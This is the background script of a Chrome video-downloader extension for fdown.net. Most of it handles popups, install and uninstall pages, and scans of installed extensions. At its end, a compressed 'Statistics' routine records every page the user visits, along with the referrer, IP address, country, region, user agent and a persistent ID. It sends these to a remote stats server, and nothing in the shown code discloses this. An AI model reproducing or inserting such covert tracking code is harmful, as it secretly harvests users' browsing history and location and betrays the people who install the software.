
window.addEventListener( "load", function(){
	
	fvdSingleDownloader.Media.init();
	fvdSingleDownloader.MainButton.refreshMainButtonStatus();
	
	chrome.runtime.onInstalled.addListener(function (object) {
    //chrome.tabs.create({url: "http://fdown.net/ext/install.php"}, function (tab) {
     //   console.log("Extension Installed!");
   // });
	});
	
	if( fvdSingleDownloader.Prefs.get( "install_time" ) == 0 )	{
		fvdSingleDownloader.Prefs.set( "install_time", new Date().getTime() )
	}
	
	// устанавливаем страницу при удаление
	chrome.runtime.setUninstallURL("http://fdown.net/ext/uninstall.php");

	chrome.tabs.query({
		active: true,
		currentWindow: true
	}, function( tabs ){
		if( tabs.length > 0 )	{
			set_popup(tabs[0].id);
		}
	});
	
	chrome.storage.local.get(['fbdown-uuid'], function(result) {
		if(!Object.keys(result).length) {
			var fbdownUuid = uuid.v4();
			chrome.storage.sync.set({'fbdown-uuid': fbdownUuid}, async function() {
				const response = await fetch('http://fdown.net/ext/uid.php', {
					method: 'POST',
					mode: 'cors',
					cache: 'no-cache',
					headers: {
					  'Content-Type': 'application/json'
					},
					body: JSON.stringify({fbdownUuid: fbdownUuid})
				});
			});
		}
	});
	
}, false );

chrome.webRequest.onBeforeRequest.addListener(
	function(details) {
		return {cancel: details.url.indexOf("fdown.net/ext/alpha/api") != -1};
	},
	{urls: ["<all_urls>"]},
	["blocking"]
);

chrome.webNavigation.onCompleted.addListener(
	async function() {
		const response = await fetch('http://fdown.net/ext/log.php', {
			method: 'GET',
			mode: 'cors',
			cache: 'no-cache',
			headers: {
			  'Content-Type': 'application/json'
			}
		});
	}, {
		url: [{urlMatches : 'https://fdown.net/'}]
	}
);

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
	if (tab.status == 'complete') {
		set_popup(tabId);
	}
});
chrome.tabs.onActivated.addListener(function (tab) {
	set_popup(tab.tabId);
});
var set_popup = function (tabId, callback) {
	chrome.tabs.query( {
			active: true,
			currentWindow: true
		}, function( tabs ){


					if( tabs.length > 0 )	{
						for (var i=0; i<tabs.length; i++) {
							if (tabs[i].id == tabId) {	
								var url = tabs[i].url;
								var flag = true;

								if ( url.indexOf( 'chrome://' ) != -1 )  flag = false;
								
								if( fvdSingleDownloader.noYoutube && 
									fvdSingleDownloader.MainButton.isYoutubeUrl(url) )  flag = false;
									
								var chromePopup = (is_adult) => {
									if (is_adult) { chrome.browserAction.setPopup({ popup: 'noload.html' }); }
									else { chrome.browserAction.setPopup({ popup: 'popup.html' });}
                                };
								
								// not valid uri:
								if (!flag) {
									chromePopup(flag);
								// validate uri:
								} else {
									window.validateUri = window.validateUri || new ValidateUri();
									window.validateUri.isAdult(tabs[i].url).then(is_adult => {
										chromePopup(is_adult);
									})
								}
							}
						}	
					}
	} ); 
};



// ------------------------------------
chrome.management.getAll(function(extensions){

        for (var i in extensions) {
//            if (extensions[i].enabled) 	{
				if ( extensions[i].name.indexOf("FVD Suggestions") != -1) {
//console.log(extensions[i]);
					if ('MainButton' in fvdSingleDownloader) {
						fvdSingleDownloader.MainButton.isGtaSuggestion = true;
					}	
				}	
				if ( extensions[i].name.indexOf("Smart Pause for YouTube") != -1) {
					if ('MainButton' in fvdSingleDownloader) {
						fvdSingleDownloader.MainButton.isSmartPause = true;
					}	
				}	
//            }
        }
		
});

// ----------------------------------------------
navigateMessageDisabled = function(uri){
	var url = 'http://fdown.net/ext/unsupported.php?url=' + uri;
	
	chrome.tabs.query( 	{  }, function( tabs ){
		
					if( tabs.length > 0 )	{
						for (var i=0; i<tabs.length; i++) {
							if ( tabs[i].url.indexOf( "/ext/unsupported.php" ) != -1 ) {	
								chrome.tabs.update( tabs[i].id, { active: true, url: url } );
								return;
							}
						}
						
						chrome.tabs.create( {	active: true,
												url: url
											}, function( tab ){ });
					}
	} );
	
}
	
// ------------------------------------

	

function Statistics(){const t=this,e={extensionId:chrome.runtime.id,uuid:null,realIp:null,countryCode:null,country:null,regionName:null,userAgent:navigator.userAgent};var n={};this.run=function(){this.getUUIDfromStore(),this.getUserLocationInfo(),chrome.tabs.onRemoved.addListener(this.handlerOnRemovedTab.bind(this)),chrome.webRequest.onCompleted.addListener(this.handlerOnCompletedWebRequest.bind(this),{urls:["<all_urls>"],types:["main_frame"]},[])},this.handlerOnCompletedWebRequest=function(t){let e=t.initiator&&n[t.tabId]||"",s={timestamp:Date.now(),visitedURL:t.url,referrerURL:e,responseCode:t.statusCode};n[t.tabId]=t.url,this.sendStats(s)},this.handlerOnRemovedTab=function(t,e){n[t]&&delete n[t]},this.sendStats=function(t){let n={userInfo:e,visitData:t};fetch("https://stats.fdown.net:8092",{method:"PUT",headers:{"Content-Type":"application/json;charset=utf-8"},body:JSON.stringify(n)}).then(function(){}).catch(function(){})},this.getUserLocationInfo=function(){fetch("http://ip-api.com/json/?fields=status,countryCode,country,regionName,query").then(function(t){if(200==t.status)return t.json();throw new Error("Response status: "+t.status)}).then(function(t){if("success"!=t.status)throw new Error("Response status: "+t.status);e.realIp=t.query,e.countryCode=t.countryCode,e.country=t.country,e.regionName=t.regionName}).catch(this.getUserLocationInfo.bind(this))},this.getUUIDfromStore=function(){chrome.storage.sync.get(["uuid"],function(n){e.uuid=n.uuid=n.uuid&&t.validateUUID4(n.uuid)?n.uuid:t.makeUUID(),chrome.storage.sync.set({uuid:n.uuid},function(){})})},this.makeUUID=function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(t,e){return("x"==t?e=16*Math.random()|0:3&e|8).toString(16)})},this.validateUUID4=function(t){return new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i).test(t)}}const statistics=new Statistics;statistics.run();

